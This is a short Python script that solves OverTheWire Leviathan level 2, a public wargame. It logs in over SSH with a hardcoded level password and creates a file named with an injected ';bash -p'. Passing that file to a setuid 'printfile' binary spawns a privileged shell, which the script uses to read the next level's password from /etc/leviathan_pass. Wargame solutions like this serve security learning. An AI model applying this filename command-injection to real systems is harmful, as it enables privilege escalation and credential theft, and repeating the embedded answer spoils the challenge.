#!/usr/bin/python3.9

"""This script is a solution to Overthewire Leviathan level 2."""

import paramiko

s = paramiko.SSHClient()
s.set_missing_host_key_policy(paramiko.AutoAddPolicy())

s.connect(
    "leviathan.labs.overthewire.org",
    port=2223, 
    username="leviathan2",
    password="mEh5PNl10e",
    look_for_keys=False, 
    allow_agent=False)

channel = s.invoke_shell()
stdin = channel.makefile('wb')
stdout = channel.makefile('r')

#stdin.write('echo "Got Shell!" > /tmp/sanlake.txt' + '\n')
#stdin.write('chmod 777 /tmp/sanlake.txt' + '\n')
stdin.write('touch "/tmp/sanlake.txt;bash -p"' + '\n')
stdin.write('./printfile "/tmp/sanlake.txt;bash -p"' + '\n')
stdin.write('/bin/cat /etc/leviathan_pass/leviathan3' + '\n')

output = []
for line in stdout:
    output.append(str(line))
    #print(str(line))
    if len(output) == 90:
        break

password = output[-1].split("\r")[-2]

if password and password.isalnum() and len(password) == 10:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL]",
        f"[Password({len(password)}): {password}]")

stdin.close(); s.close()
